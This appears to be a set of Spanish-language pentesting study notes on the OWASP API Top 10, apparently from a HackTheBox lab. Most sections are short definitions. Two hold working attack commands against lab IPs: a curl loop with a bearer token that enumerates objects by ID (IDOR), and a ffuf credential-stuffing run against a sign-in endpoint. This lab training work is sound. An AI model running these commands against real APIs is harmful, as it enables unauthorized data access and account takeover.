# Broken Object Level Authorization
Podemos ver informacion sin necesidad de autenticacion, como los IDORs
```
for ((i=1; i<= 20; i++)); do
curl -s -w "\n" -X 'GET' \
  'http://94.237.49.212:43104/api/v1/supplier-companies/yearly-reports/'$i'' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjFAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOiJTdXBwbGllckNvbXBhbmllc19HZXRZZWFybHlSZXBvcnRCeUlEIiwiZXhwIjoxNzIwMTg1NzAwLCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.D6E5gJ-HzeLZLSXeIC4v5iynZetx7f-bpWu8iE_pUODlpoWdYKniY9agU2qRYyf6tAGdTcyqLFKt1tOhpOsWlw' | jq
done
```

# Broken Authentication
Incorrecta validacion de permisos del usuario
```
ffuf -w /opt/useful/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASS -w customerEmails.txt:EMAIL -u http://94.237.59.63:31874/api/v1/authentication/customers/sign-in -X POST -H "Content-Type: application/json" -d '{"Email": "EMAIL", "Password": "PASS"}' -fr "Invalid Credentials" -t 100
```

# Broken Object Property Level Authorization
Es una vulnerabilidad donde la API no valida si el usuario tiene permiso para acceder o modificar PROPIEDADES ESPECÍFICAS de un objeto.

# Unrestricted Resource Consumption   
El servidor no valida el tamaño del archivo subido

# Broken Function Level Authorization
Es una vulnerabilidad donde la API no valida si el usuario tiene permiso para ejecutar FUNCIONES/ENDOPOINTS específicos

# Unrestricted Access to Sensitive Business Flows
Es una vulnerabilidad donde la API no limita el acceso o abuso de procesos de negocio sensibles

# Server Side Request Forgery (SSRF)
<img width="2880" height="1800" alt="image" src="https://github.com/user-attachments/assets/7ba2982f-b957-493d-b3d4-fb42d7fa2cea" />

# Security Misconfiguration
## SQLi
<img width="2880" height="1800" alt="image" src="https://github.com/user-attachments/assets/e53c4fb2-8ac4-462b-88be-d34a3998caf5" />

## HTTP Headers

# Improper Inventory Management
Es una vulnerabilidad donde la API expone, permite modificar o no mantiene control adecuado sobre el inventario de recursos

# Unsafe Consumption of APIs
Es una vulnerabilidad donde una API consume (llama) otra API de manera insegura, sin validar adecuadamente las respuestas, sin manejar errores correctamente, o confiando ciegamente en datos externos.
